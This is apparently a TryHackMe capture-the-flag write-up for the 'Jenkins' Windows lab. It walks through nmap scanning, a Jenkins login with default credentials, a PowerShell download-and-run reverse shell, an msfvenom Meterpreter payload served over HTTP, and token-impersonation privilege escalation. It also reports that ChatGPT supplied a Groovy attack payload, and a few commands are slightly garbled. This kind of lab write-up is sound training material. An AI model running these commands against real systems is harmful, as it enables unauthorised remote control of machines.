# 🧠 **Jenkins - TryHackMe Write-up**

## 🛠️ **Info**
- **IP Address:** 10.10.169.235
- **Difficulty:** Easy, Windows
- **Date:** April 2025
- **Goal:** Capture `user.txt` and `root.txt` 🏁

---

## 🔍 **Enumeration**

### Starting with an Nmap scan:

We begin by scanning open ports:

```bash
sudo nmap -p- --min-rate 10000 -T4 --open 10.10.169.235 -Pn

```
# Initial Scan Results

We ran a quick Nmap scan and discovered three open ports:

- **Port 80**: HTTP (IIS)
- **Port 3389**: RDP (Remote Desktop Protocol)
- **Port 8080**: HTTP (Jetty Server)

Now, let's do a more detailed scan:

```bash
nmap 10.10.169.235 -sV -sC -A -vv -oA agr_scan -T4 -p80,8080,3389 -Pn
```

The scan revealed:

- **Port 80**: IIS 7.5
- **Port 3389**: RDP with SSL certificate (alfred)
- **Port 8080**: Jetty 9.4.z-SNAPSHOT (Jenkins login page)

The fun begins on **Port 8080**, which hosts the Jenkins login page. Trying the default credentials (`admin:admin`) got us logged into the admin account. 🎉

## Initial Foothold

Since we’re dealing with a Jenkins CMS, we check the version:

- **Jenkins Version**: 2.190.1

There are no public exploits available for this version, so I used ChatGPT to generate a Groovy payload which gave us simple shell which helped us to switch shells for further exploitation.

## Exploit: Using the Script Console in Jenkins

We know there’s an IIS server running, so we’ll use a PowerShell payload to execute a reverse shell. We'll use the script from Nishang:

Invoke-PowerShellTcp.ps1 **You can get this payload from GitHub**

powershell iex (New-Object Net.WebClient).DownloadString('http://your-ip:your-port/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress your-ip -Port your-port


This command allows us to download and execute the payload. Set up a listener on your attacking machine:

```bash
nc -lvnp 4444
```
Upload the payload using a Python server and execute it. 🎯

If this doesn't work, don’t panic! ChatGPT saved the day by suggesting a Groovy payload for the Jenkins console, which worked like a charm.

## Privilege Escalation

Now that we have user access, let's enumerate for possible Privilege Escalation (PrivEsc) opportunities. We use the following command:

```bash
whoami /priv
```
This reveals that **SeImpersonatePrivilege** is enabled, giving us a perfect opportunity for Privilege Escalation.

# Exploiting the Machine

We’re going to exploit the machine by creating a reverse Meterpreter shell and setting up a listener in Metasploit. Here's the process step-by-step:

## Step 1: Generate the Payload
Use `msfvenom` to create a reverse Meterpreter payload:


```bash
msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=IP LPORT=PORT -f exe -o shell-name.exe
```

**Explanation:**
- `LHOST` is your local IP.
- `LPORT` is the port you’ll listen on.
- `shell-name.exe` is the name of the payload.

## Step 2: Set Up the Listener
Start Metasploit and set up a listener to catch the reverse shell:

```bash
msfconsole use exploit/multihandler use payload windows/meterpreter
```
Set the appropriate options for `LHOST` and `LPORT` as per your setup.

## Step 3: Serve the Payload
Use a Python HTTP server to send the payload to the target machine:


```bash
python -m SimpleHTTPServer 8080
```
Download the payload onto the target machine and execute it. The listener you set up should now catch the reverse shell.

## Step 4: Launch the Payload
On the target machine, run the following to execute the payload: `rshell.exe`


The Meterpreter shell should now be connecting.

## Step 5: Escalate Privileges with Token Impersonation
Now that we have a shell, we need to elevate our privileges.

Run the following to list available tokens:`token_list -g`


Identify the `BUILTIN\Administrator` token and impersonate it. This will allow us to become `NT\Authority`.

## Step 6: Migrate to a New Process
To solidify our root privileges, migrate to a process running with the primary token. In this case, we’ll migrate to `spoolsvc.exe`: `migrate <PID>`


Now, you should have full privileges.

## Step 7: Read the Root Flag
At this point, you're Administrator (or root). To read the root flag, navigate to the flag's location and open it. `cat root.txt`


## Conclusion
That’s it! You've successfully exploited the machine by using token impersonation and migration to escalate privileges and capture the flag.

**Happy Hacking!**










